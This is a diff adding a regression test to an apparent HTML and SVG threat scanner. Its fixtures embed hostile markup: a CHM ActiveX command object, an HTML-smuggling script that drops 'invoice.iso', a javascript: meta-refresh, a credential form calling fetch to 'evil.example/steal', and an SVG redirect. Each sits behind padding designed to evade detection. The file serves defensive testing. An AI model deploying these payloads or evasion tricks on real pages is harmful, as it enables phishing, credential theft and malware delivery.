@@ -656,3 +656,53 @@ def test_review_r6_regressions_foreign_self_closing_and_html5_eq_attr_states(
         assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
             _scan(tmp_path, f"eq_meta_{idx}.html", doc_meta)
         )
+
+
+def test_review_r7_regressions_foreignobject_html_ns_and_streaming_caps(
+    tmp_path: Path,
+) -> None:
+    # Blocker 1: <textarea/> inside <svg><foreignObject> in .html is HTML namespace (RCDATA)
+    fo_doc = (
+        b'<!DOCTYPE html><html><body><svg><foreignObject><textarea/><x a="</textarea>'
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+        b'<!--"--></foreignObject></svg></body></html>'
+    )
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "fo_ta_chm.html", fo_doc))
+
+    # Blocker 2a: 40 benign download names before risky .iso must NOT starve HTML_SMUGGLING
+    benign_dls = "".join(f'<a download="f{i}.txt" href="#">x</a>' for i in range(40))
+    smug_pad = (
+        f"<!DOCTYPE html><body>{benign_dls}<script>"
+        "var b=new Blob([atob('SGVsbG8=')]); var u=URL.createObjectURL(b);"
+        "var a=document.createElement('a'); a.download='invoice.iso'; a.click();"
+        "</script></body></html>"
+    ).encode()
+    assert "HTML_SMUGGLING" in _rule_ids(_scan(tmp_path, "dl_starve.html", smug_pad))
+
+    # Blocker 2b: 12 benign https:// meta-refresh tags before javascript: meta-refresh
+    benign_metas = "".join(
+        f'<meta http-equiv="refresh" content="{i};url=https://example.org">' for i in range(12)
+    )
+    meta_pad = (
+        f"<!DOCTYPE html><head>{benign_metas}"
+        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)"></head></html>'
+    ).encode()
+    assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(_scan(tmp_path, "meta_starve.html", meta_pad))
+
+    # Blocker 2c: 150 empty <script></script> + 80 benign onclick="0" before exfil fetch()
+    pad_scripts = "<script></script>" * 150
+    pad_events = "".join('<span onclick="0"></span>' for _ in range(80))
+    cred_pad = (
+        f"<!DOCTYPE html><body>{pad_scripts}{pad_events}"
+        '<form><input type="password"></form>'
+        "<script>fetch('https://evil.example/steal')</script></body></html>"
+    ).encode()
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "cred_starve.html", cred_pad))
+
+    # Blocker 2d: 150 empty <script></script> before SVG redirect
+    svg_pad = (
+        f'<svg xmlns="http://www.w3.org/2000/svg">{pad_scripts}'
+        "<script>window.location='https://evil.example'</script></svg>"
+    ).encode()
+    assert "SVG_EXTERNAL_REDIRECT" in _rule_ids(_scan(tmp_path, "svg_starve.svg", svg_pad))
